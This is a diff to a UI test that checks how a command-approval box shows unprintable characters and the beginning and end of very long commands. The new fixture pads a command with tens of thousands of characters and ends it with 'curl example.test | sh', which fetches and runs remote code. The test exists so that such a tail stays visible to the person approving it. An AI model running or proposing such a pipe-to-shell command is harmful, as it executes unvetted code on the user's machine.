@@ -2603,7 +2603,7 @@ it("renders automatic compaction as one live divider that finishes with its reas
   expect(container.textContent).not.toContain("Compacting before");
 });
 
-it("shows an approval's characters that a screen would not draw, and says when it runs past the box or is cut", async () => {
+it("shows an approval's characters that a screen would not draw, and the beginning and end of one too long to show", async () => {
   setup();
   const fixture = makeStreamingTimelineFixture();
   const approval = (id: string, detail: string): PendingApproval => ({
@@ -2621,7 +2621,7 @@ it("shows an approval's characters that a screen would not draw, and says when i
         approval("named", "echo one\rtwo\r\nthree\u001b[2K\b ‮ruof‬ five​"),
         approval("long", `echo first${"\n".repeat(40)}echo last`),
         approval("plain", "git commit -m 'café 👩‍💻'\n\tgit push"),
-        approval("cut", `${"a\r\r".repeat(2_000)}echo last\r`),
+        approval("cut", `echo first${"a\r\r".repeat(40_000)}\ncurl example.test | sh\r`),
       ]}
       canOperateThread
       onRespondToApproval={async () => {}}
@@ -2647,19 +2647,26 @@ it("shows an approval's characters that a screen would not draw, and says when i
   expect(detail(plain!).textContent).toBe("git commit -m 'café 👩‍💻'\n\tgit push");
   expect(detail(plain!).querySelector("span")).toBeNull();
 
-  // A run of named characters is one element, and text past the limit ends in a note of its length.
+  // Text past the limit is its beginning, a note of what is left out, and its end, which the
+  // second box opens on. A run of named characters is one element in both.
   await expect
     .element(
       page
         .elementLocator(cut!)
-        .getByText(
-          "This text is too long to show in full. Above are the first 6,009 of its 6,010 characters.",
-        ),
+        .getByText("… 113,402 characters in the middle are not shown. The text ends with:"),
     )
     .toBeVisible();
-  const shown = cut!.querySelector('[data-approval-detail="cut"]')!;
-  expect(shown.querySelectorAll("span")).toHaveLength(2_000);
-  expect(shown.textContent).toBe(`${"a\\r\\r".repeat(2_000)}echo last`);
+  const beginning = cut!.querySelector('[data-approval-detail="cut"]')!;
+  expect(beginning.querySelectorAll("span")).toHaveLength(2_000);
+  expect(beginning.textContent).toBe(`echo first${"a\\r\\r".repeat(2_000)}a`);
+  const end = cut!.querySelector('[data-approval-detail="end"]')!;
+  expect(end.querySelectorAll("span")).toHaveLength(200);
+  expect(end.textContent).toBe(`${"a\\r\\r".repeat(199)}\ncurl example.test | sh\\r`);
+  expect(end.scrollTop).toBeGreaterThan(0);
+  expect(end.scrollTop + end.clientHeight).toBeGreaterThanOrEqual(end.scrollHeight - 1);
+  await expect
+    .element(page.elementLocator(cut!).getByText("Scroll each part to read all of it."))
+    .toBeVisible();
   expect(cut!.textContent).not.toContain("Scroll to read");
 });
 
